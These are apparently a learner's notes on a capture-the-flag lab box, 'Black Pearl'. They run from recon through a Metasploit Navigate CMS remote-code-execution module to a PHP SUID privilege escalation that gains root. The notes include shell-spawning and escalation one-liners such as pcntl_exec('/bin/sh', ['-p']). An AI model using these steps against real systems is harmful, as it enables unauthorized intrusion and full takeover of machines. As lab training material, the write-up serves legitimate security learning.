- ip 192.168.60.9
- nmap gives 22/ssh, 53/domain (dns) , 80/http
- viewing page source we find `<!-- Webmaster: alek@blackpearl.tcm -->`
- ffuf 192.168.60.9 gives /secret 
- we get a file named secret , saying dir busting wont get you anywhere
- recon /53 dns
	- `dnsrecon -r 127.0.0.0/24 -n [ip|192.168.60.9] -d hi`
	- output ```[+] PTR blackpearl.tcm 127.0.0.1
				[+] 1 Records Found```
	- we have add that dns to our system
		- `nano /etc/hosts`
		- add `[ip|192.168.60.9] blackpearl.tcm`
	- now we can access blackpearl.tcm from our machine
- ffuf blackpearl.tcm gives  /navigate 
- we find navigatecms login page : with infos  v2.3 
- we find navigatecms exploit in metasploit : `Navigate CMS Unauthenticated Remote Code Execution`
			- ```Description:
			  This module exploits insufficient sanitization in the database::protect
			  method, of Navigate CMS versions 2.8 and prior, to bypass authentication.
			
			  The module then uses a path traversal vulnerability in navigate_upload.php
			  that allows authenticated users to upload PHP files to arbitrary locations.
			  Together these vulnerabilities allow an unauthenticated attacker to
			  execute arbitrary PHP code remotely.```
- we use *exploit/multi/http/navigate_cms_rce*
	- set rhost
	- set vhost blackpearl.tcm
	- exploit works !! meterpreter session opens
	- open a shell by using `shell`
- we have access as www-data
- to open a tty shell
	- check if python is available `which python`
	- `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- search for priv escalation using [[linpeas]]
- we find ***Unknown SUID binary*** in linpeas
	- here we have access run it in root group privilege
- use `find / -type f -perm -4000 2>/dev/null` to list files with these permissions in a neater way (same thing linpeas did).
- check if any of it has any priv escalation in gtfobin. 
- we find php has a vuln in SUID
	- `./php -r "pcntl_exec('/bin/sh', ['-p']);"`
	- find where php binary is stored -> `/usr/bin/php`
	- run `/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"`
	- SUCCESS , access as root received
	- id -> uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
	- flag found
				 ```Good job on this one.
				Finding the domain name may have been a little guessy,
				but the goal of this box is mainly to teach about Virtual Host Routing which is used in a lot of CTF.```
		